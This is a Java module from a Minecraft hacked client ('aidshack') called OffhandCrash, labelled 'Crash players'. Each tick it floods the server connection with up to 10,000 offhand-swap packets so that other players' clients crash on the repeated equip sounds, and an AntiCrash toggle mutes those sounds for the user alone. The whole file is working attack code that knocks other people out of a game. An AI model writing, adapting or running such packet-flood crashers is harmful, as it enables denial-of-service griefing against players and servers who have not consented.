package cc.aidshack.module.impl.other;

import cc.aidshack.event.EventTarget;
import cc.aidshack.event.events.EventSound;
import cc.aidshack.mixins.ClientConnectionAccessor;
import cc.aidshack.module.Module;
import cc.aidshack.module.settings.BooleanSetting;
import cc.aidshack.module.settings.DecimalSetting;
import io.netty.channel.Channel;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.sound.SoundEvents;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

public class OffhandCrash extends Module {

    public DecimalSetting speed = new DecimalSetting("Speed", 100, 10000, 1000, 100);
    public BooleanSetting crash = new BooleanSetting("Crash", false);
    public BooleanSetting antiCrash = new BooleanSetting("AntiCrash", false);

    public OffhandCrash() {
        super("OffhandCrash", "Crash players", false, Category.OTHER);
        addSettings(speed, crash, antiCrash);
    }

    @Override
    public void onTick() {
        if (crash.isEnabled()) {
            Channel channel = ((ClientConnectionAccessor) mc.player.networkHandler.getConnection()).getChannel();
            for (int i = 0; i < speed.getValue(); i++) {
                channel.write(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, new BlockPos(0, 0, 0) , Direction.UP));
            }
            channel.flush();
        }
        super.onTick();
    }

    @EventTarget
    public void onSound(EventSound event) {
        if (antiCrash.isEnabled() && event.sound == SoundEvents.ITEM_ARMOR_EQUIP_GENERIC) event.setCancelled(true);
    }
}